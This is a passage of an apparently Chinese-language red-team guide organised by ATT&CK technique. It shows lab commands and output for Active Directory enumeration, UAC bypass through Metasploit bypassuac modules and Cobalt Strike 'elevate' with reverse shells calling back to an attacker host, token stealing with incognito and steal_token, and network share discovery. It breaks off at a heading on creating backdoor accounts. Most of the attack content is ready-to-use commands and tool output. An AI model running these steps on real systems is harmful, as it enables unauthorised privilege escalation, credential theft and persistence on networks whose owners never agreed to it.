<pre><code>C:\Users\Administrator\Desktop\powrshell&gt;net user administrator
用户名                 Administrator
全名
注释                   管理计算机(域)的内置帐户
用户的注释
国家/地区代码          000 (系统默认值)
帐户启用               Yes
帐户到期               从不

上次设置密码           2019-7-14 23:28:47
密码到期               从不
密码可更改             2019-7-14 23:28:47
需要密码               Yes
用户可以更改密码       Yes

允许的工作站           All
登录脚本
用户配置文件
主目录
上次登录               2019-9-7 10:08:43

可允许的登录小时数     All

本地组成员             *Administrators
全局组成员             *None
命令成功完成。


</code></pre>
<h4><a id="user-content-msf下操作-21" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-21"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>post/windows/gather/enum_ad_users</p>
<p>auxiliary/scanner/smb/smb_enumusers</p>
</blockquote>
<pre><code>msf5 post(windows/gather/enum_ad_users) &gt; exploit 

[-] Unable to find the domain to query.
[*] Post module execution completed

</code></pre>
<h3><a id="user-content-query-active-directory-for-users-groups-and-permissions查询active-directory中的用户组和权限" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#query-active-directory-for-users-groups-and-permissions%E6%9F%A5%E8%AF%A2active-directory%E4%B8%AD%E7%9A%84%E7%94%A8%E6%88%B7%E7%BB%84%E5%92%8C%E6%9D%83%E9%99%90"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Query Active Directory for users, groups and permissions(查询Active Directory中的用户、组和权限)</h3>
<h4><a id="user-content-terminal下操作-27" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-27"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<pre><code>dsquery group "ou=Domain Admins,dc=domain,dc=com"
dsquery user "dc=domain,dc=com"
dsquery * OU="Domain Admins",DC=domain,DC=com -scope base -attr SAMAccountName userPrincipalName Description
dsquery * -filter "(&amp;(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))" -Attr samAccountName mail -Limit 0
dsquery * -filter "(&amp;(objectCategory=group)(name=*Admin*))" -Attr name description members

</code></pre>
<h2><a id="user-content-bypass-user-account-control" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#bypass-user-account-control"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Bypass User Account Control</h2>
<h3><a id="user-content-bypass-uac" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#bypass-uac"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>bypass UAC</h3>
<h4><a id="user-content-msf下操作-22" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-22"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>exploit/windows/local/bypassuac</p>
<p>exploit/windows/local/bypassuac_injection</p>
<p>exploit/windows/local/bypassuac_vbs</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>msf5 exploit(windows/local/bypassuac) <span class="pl-k">&gt;</span> exploit 

[<span class="pl-k">*</span>] Started reverse TCP handler on 192.168.2.103:4444 
[-] Exploit aborted due to failure: none: Already <span class="pl-k">in</span> elevated state
[<span class="pl-k">*</span>] Exploit completed, but no session was created.


msf5 exploit(windows/local/bypassuac_injection) <span class="pl-k">&gt;</span> exploit 

[<span class="pl-k">*</span>] Started reverse TCP handler on 192.168.2.103:4444 
[-] Exploit aborted due to failure: none: Already <span class="pl-k">in</span> elevated state
[<span class="pl-k">*</span>] Exploit completed, but no session was created.


msf5 exploit(windows/local/bypassuac_vbs) <span class="pl-k">&gt;</span> exploit 

[<span class="pl-k">*</span>] Started reverse TCP handler on 192.168.2.103:4444 
[-] Exploit aborted due to failure: none: Already <span class="pl-k">in</span> elevated state
[<span class="pl-k">*</span>] Exploit completed, but no session was created.
</pre></div>
<h4><a id="user-content-cs下操作-30" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-30"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>access --&gt;  elevate</p>
</blockquote>
<pre><code>beacon&gt; elevate uac-dll test
[*] Tasked beacon to spawn windows/beacon_http/reverse_http (192.168.2.103:6666) in a high integrity process
[+] host called home, sent: 101435 bytes
[+] received output:
[*] Wrote hijack DLL to 'C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\9970.dll'
[-] Privileged file copy failed: C:\WINDOWS\System32\sysprep\CRYPTBASE.dll

beacon&gt; elevate uac-eventvwr test
[*] Tasked Beacon to run windows/beacon_http/reverse_http (192.168.2.103:6666) in a high integrity context
[+] host called home, sent: 2798 bytes
[+] host called home, sent: 2498 bytes
[+] host called home, sent: 125001 bytes
[-] could not spawn C:\WINDOWS\system32\rundll32.exe (token): 1349
[-] Could not connect to pipe: 2

beacon&gt; elevate uac-token-duplication test
[+] host called home, sent: 3545 bytes
[*] Tasked beacon to spawn windows/beacon_http/reverse_http (192.168.2.103:6666) in a high integrity process (token duplication)
[+] host called home, sent: 79378 bytes
[+] received output:
[-] You're already in a high integrity context.


beacon&gt; elevate uac-wscript test
[*] Tasked Beacon to run windows/beacon_http/reverse_http (192.168.2.103:6666) in a high integrity context
[+] host called home, sent: 2802 bytes
[+] host called home, sent: 128999 bytes
[-] could not spawn C:\WINDOWS\system32\rundll32.exe (token): 1349
[-] Could not connect to pipe: 2

</code></pre>
<h2><a id="user-content-access-token-manipulation访问令牌操作" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#access-token-manipulation%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%E6%93%8D%E4%BD%9C"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Access Token Manipulation(访问令牌操作)</h2>
<p>原理：</p>
<pre><code>Adversaries may use access tokens to operate under a different user or system security context to perform actions and evade detection. An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.

简单来说就是攻击者可以使用访问令牌在不同的用户或系统安全上下文中操作，以执行操作和逃避检测。攻击者可以使用内置的Windows API函数从现有进程复制访问令牌;这就是所谓的令牌窃取

常用方法：

` 令牌模拟/盗窃
` 使用令牌创建进程
` Make和Impersonate令牌

注：任何标准用户都可以使用runas命令和Windows API函数创建模拟令牌;它不需要访问管理员帐户

</code></pre>
<h3><a id="user-content-token-stealing令牌窃取" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#token-stealing%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Token stealing（令牌窃取）</h3>
<h4><a id="user-content-msf下操作-23" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-23"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<pre><code>use incognito
list_tokens -u
impersonate_token DOMAIN\\User
or:
steal_token {pid}

</code></pre>
<pre><code>meterpreter &gt; use incognito 
Loading extension incognito...Success.
meterpreter &gt; list_tokens -u

Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
ROOT-5DE52AC98B\Administrator

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON


</code></pre>
<h4><a id="user-content-cs下操作-31" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-31"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>steal_token pid</p>
</blockquote>
<pre><code>beacon&gt; steal_token 1228
[*] Tasked beacon to steal token from PID 1228
[+] host called home, sent: 12 bytes

</code></pre>
<h2><a id="user-content-network-share-discovery-网络共享发现" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#network-share-discovery-%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E5%8F%91%E7%8E%B0"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Network Share Discovery (网络共享发现)</h2>
<h3><a id="user-content-dump-network-shared-resource-information输出网络共享资源信息" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#dump-network-shared-resource-information%E8%BE%93%E5%87%BA%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB%E8%B5%84%E6%BA%90%E4%BF%A1%E6%81%AF"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Dump network shared resource information（输出网络共享资源信息）</h3>
<h4><a id="user-content-terminal下操作-28" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-28"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>net share</p>
</blockquote>
<pre><code>C:\Users\Administrator\Desktop\powrshell&gt;net share

共享名       资源                            注解

-------------------------------------------------------------------------------
C$           C:\                             默认共享
D$           D:\                             默认共享
IPC$                                         远程 IPC
ADMIN$       C:\Windows                      远程管理
命令成功完成。
</code></pre>
<h4><a id="user-content-msf下操作-24" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-24"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>auxiliary/scanner/smb/smb_enumshares</p>
</blockquote>
<pre><code>msf5 auxiliary(scanner/smb/smb_enumshares) &gt; exploit 

[-] 192.168.2.114:139     - Login Failed: Unable to Negotiate with remote host
[*] 192.168.2.114:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

</code></pre>
<h4><a id="user-content-cs下操作-32" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-32"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>shell net share</p>
</blockquote>
<h3><a id="user-content-list-of-workstations-and-network-devices工作组和网络设备列表" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#list-of-workstations-and-network-devices%E5%B7%A5%E4%BD%9C%E7%BB%84%E5%92%8C%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E5%88%97%E8%A1%A8"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>List of workstations and network devices(工作组和网络设备列表)</h3>
<h4><a id="user-content-terminal下操作-29" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-29"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>net view \host /all [/domain:domain]</p>
</blockquote>
<pre><code>C:\Users\Administrator\Desktop\powrshell&gt;net view /all
发生系统错误 6118。

此工作组的服务器列表当前无法使用

</code></pre>
<h4><a id="user-content-msf下操作-25" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-25"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>auxiliary/scanner/smb/smb_enumshares</p>
</blockquote>
<h4><a id="user-content-cs下操作-33" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-33"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>net view \host /domain</p>
</blockquote>
<h2><a id="user-content-create-account创建认证" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#create-account%E5%88%9B%E5%BB%BA%E8%AE%A4%E8%AF%81"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Create Account(创建认证)</h2>
<h3><a id="user-content-create-backdoor-user-account创建后门用户帐户" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#create-backdoor-user-account%E5%88%9B%E5%BB%BA%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Create backdoor user account（创建后门用户帐户）</h3>
